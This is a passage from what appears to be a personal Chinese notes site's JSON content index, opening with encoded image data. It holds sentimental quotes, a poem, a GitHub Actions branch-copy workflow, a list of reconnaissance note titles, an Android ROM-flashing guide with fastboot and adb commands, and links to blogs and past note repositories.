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)\n\n  \n\n  \n\n  \n\n——@言萩\n\n  \n\n  \n\n  \n\n  \n\n  \n\n  \n\n  \n\n- 09 -\n\n  \n\n  \n\n  \n\n写歌的人断了肠，听歌的人湿了心。\n\n  \n\n  \n\n  \n\n——@我是一个没有感情的可乐杀手\n\n  \n\n  \n\n  \n\n- 10 -\n\n  \n\n  \n\n  \n\n枕头里藏满了发霉的梦，梦里住着无法拥有的人。\n\n  \n\n  \n\n  \n\n——@白茶青欢了无事i\n\n  \n\n  \n\n  \n\n在梦里，我们并不觉得梦到的一切都是幻象，也会因为遭遇的不同而生出各种喜怒哀乐，只有在醒来之后才恍然大悟。\n\n  \n\n  \n\n  \n\n那么，清醒之后的世界难道不会是更大的一个梦吗？祝大家都成为逐梦人。\n\n  \n\n【音乐：种种 】","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E4%BD%BF%E7%94%A8Github-action%E5%A4%8D%E5%88%B6%E5%88%86%E6%94%AF%E6%96%87%E4%BB%B6%E5%88%B0%E5%90%8C%E4%BB%93%E5%BA%93%E7%9A%84%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF":{"title":"使用Github action复制分支文件到同仓库的另一个分支","content":"\n- 来源：[](https://github.com/marketplace/actions/file-sync)[https://github.com/marketplace/actions/file-sync](https://github.com/marketplace/actions/file-sync)\n- 看第二个回答： [](https://stackoverflow.com/questions/69577518/github-action-to-copy-specific-folders-from-one-branch-to-another-in-the-same-re)[https://stackoverflow.com/questions/69577518/github-action-to-copy-specific-folders-from-one-branch-to-another-in-the-same-re](https://stackoverflow.com/questions/69577518/github-action-to-copy-specific-folders-from-one-branch-to-another-in-the-same-re)\n- ```\n  name: Copy folder to other branch\n  \n  on: [push]\n  \n  jobs:\n    copy:\n      name: Copy my folder\n      runs-on: ubuntu-latest\n      steps:\n        - uses: actions/checkout@v2\n        - name: copy\n          env:\n            SRC_FOLDER_PATH: 'static'\n            TARGET_BRANCH: 'dest'\n          run: |\n            files=$(find $SRC_FOLDER_PATH -type f) # get the file list\n            git config --global user.name 'GitHub Action'\n            git config --global user.email 'action@github.com'\n            git fetch                         # fetch branches\n            git checkout $TARGET_BRANCH       # checkout to your branch\n            git checkout ${GITHUB_REF##*/} -- $files # copy files from the source branch\n            git add -A\n            git diff-index --quiet HEAD ||  git commit -am \"deploy files\"  # commit to the repository (ignore if no modification)\n            git push origin $TARGET_BRANCH # push to remote branch\n  ```\n-\n-","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E4%BF%A1%E5%B0%81":{"title":"信封","content":"# 信封\n\n你\n\n要相信世界上一定会有一个你的爱人，\n\n无论你此刻正被光芒环绕，\n\n被掌声淹没，\n\n还是那时你正孤独地走在寒冷的街道上被大雨淋湿，\n\n无论是飘着小雪的微凉清晨，\n\n还是被热浪炙烤的薄暮黄昏，\n\n他一定会穿越这个世界上汹涌的人群，他一一地走过他们，怀着一颗用力跳动的心脏走向你。\n\n他一定会捧着满腔的热和目光里沉甸甸的爱，走向你、抓紧你。\n\n他会迫不及待地走到你的身边，\n\n如果他年轻，\n\n那他一定会像顽劣的孩童霸占着自己的玩具不肯与人分享般的拥抱你。\n\n如果他已经不再年轻，\n\n那他一定会像披荆斩棘归来的猎人，\n\n在你身旁燃起篝火。\n\n然后拥抱着你疲惫而放心地睡去。\n\n他一定会找到你。你要等。","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86":{"title":"信息收集","content":"- [[01-域名信息收集]]\n- [[02-ip信息收集]]\n- [[03-端口服务信息收集]]\n- [[04-CMS指纹识别]]\n- [[05-CDN指纹识别]]\n- [[06-WAF指纹识别]]\n- [[07-搜索引擎收集信息]]\n- [[08-网络空间搜索引擎]]\n- [[09-目录扫描收集信息]]\n- [[10-git信息收集]]\n- [[11-信息收集总结]]","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%88%B7%E6%9C%BA%E5%B8%B8%E7%94%A8":{"title":"刷机常用","content":"\n# 基本\n## 模式\n\nfastboot模式：小米是开机长按音量下，用于线刷，包格式是tgz\n\nrecovery：卡刷，小米是开机长按音量上，rom包格式是zip（以下简称rec）\n\n9008：没用过，貌似老机型插线\n# 刷入recovery\n\n注意：目前很多安卓都需要解锁bl才能刷机\n\n进入fastboot模式，如果是命令，需要安装安卓官网的adb工具包，配置环境变量。\n使用命令\n\n```bash\nfastboot flash recovery C:\\Users\\tianzhongs\\Downloads\\recovery.img\n```\n\n\n或者采用工具如`秋之盒`，一般刷机工具都内置了老版本的adb工具包。\n# 卡刷\n\n进入recovery模式\n\n目前市面上常用的第三方rec主要有橙狐（orangefox），twrp\n线刷卡刷包\n\n```bash\nadb sideload X:/XXX.zip\n```\n# 线刷\n\n进入fastboot模式\n\n使用工具线刷宝、刷机精灵、官方的miflash（Pro）等\n\n使用命令\n### 刷机三步骤\n\n1. 备份：\n1. 可以**备份应用数据**的主要有系统内置的（如小米，但是需要系统也是miui才能恢复），钛备份（需要root才能备份和恢复）\n2. 注意备份之后将数据存到电脑或者其他设备上，因为清除数据或者data分区会将数据清楚掉\n2. 清楚数据：主要指的是data分区，在rec中找到清楚栏目，格式化data分区即可\n3. 刷入zip包，如果刷入的是apk文件，貌似可以让其成为\n# 小米ROM资源网站\n\n1. [xda](https://forum.xda-developers.com/)\n2. [AbhiX ROG Edition 22.7.19 Beta Raphael MIUIFlash](https://miuiflash.com/ports/raphael/abhix-rog-edition/abhix-rog-edition-22-7-19-beta-raphael)\n3. [142个安卓类原生、官改ROM合集，总有一款适合你！ 哔哩哔哩 (bilibili.com)](https://www.bilibili.com/read/cv17362377/)\n4. [FiimeROM-小米原生|红米原生|小米移植|MiROM|官改|小米官方|SGSI|驱动|Magisk|Lsposed|Xiaomi|Redmi|MIUI14](https://mi.fiime.cn/)  （貌似需要收费）\n5. 酷安、移动叔叔、吾爱破解，github、微博\n6. [ark社区](https://www.akr-developers.com/)\n7. [https://xiaomirom.com/](https://xiaomirom.com/)\n8. [rom乐园](http://www.romleyuan.com/)\n# 其他注意事项\n## 网络连接\n\n刷机国外的ROM第一次进入的时候，需要使用google的服务才能进入主页面，所以连接WiFi和数据可能都没有办法进入主页，此时就需要使用代理\n\n1. 使用电脑开启代理`v2rayn`或者`clash`\n2. 开启局域网可用，可以看到**监听的端口号**\n3. 电脑打开热点，查看电脑热点的局域网ip地址\n4. 手机连接电脑的热点，点击wifi名称，点击高级设置，找到 **`代理`**  ，选择代理中的**手动**，设置ip地址为局域网中电脑的ip地址，就是上图中的ip，端口号设置为clash等代理软件中设置的监听端口。","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%8D%9A%E5%AE%A2":{"title":"博客","content":"一些不错的博客\n1. [Activities - xLog](https://xlog.app/activities) 博客平台","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%8E%86%E5%8F%B2%E7%AC%94%E8%AE%B0%E5%BA%93":{"title":"历史笔记库","content":"\n\n-  第一个\n\t- [Notion](https://www.notion.so)\n- 第二个：Obsidian\n\t- [ObZhishiku](https://github.com/tianzhongs/ObZhishiku)\n\t- [obtoknow](https://github.com/tianzhongs/obtoknow)\n- 第三个：logseq\n\t- [duoji](https://github.com/tianzhongs/duoji)\n- 第四个：Obsidian\n\t- 多记\n- 